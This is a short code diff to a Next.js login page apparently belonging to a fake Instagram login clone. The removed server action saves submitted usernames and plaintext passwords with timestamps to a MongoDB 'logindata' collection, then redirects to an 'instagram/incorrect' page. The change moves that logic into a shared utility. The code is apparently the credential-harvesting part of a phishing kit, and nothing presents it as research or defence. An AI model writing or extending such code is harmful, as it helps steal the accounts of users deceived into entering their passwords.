@@ -1,26 +1,11 @@
-import { connectDB } from "@/utils/database";
-import { redirect } from 'next/navigation';
 import styles from './page.module.css';
 import Header from "@/app/component/Header";
 import LoginForm from "@/app/component/loginForm";
+import { handleSubmit } from "@/utils/database";
 
 export default async function Incorrect(){ 
 
   const title = '로그인';
-  
-  const db = (await connectDB).db('login');
-  async function handleSubmit(formData) {
-    'use server';  
-
-    const data = {
-      id: formData.get('id'),
-      password: formData.get('password'),
-      date: new Date(),
-    };
-    const db = (await connectDB).db('login');
-    await db.collection('logindata').insertOne(data);
-    redirect('/login/instagram/incorrect');
-  }
 
   return (
     <>
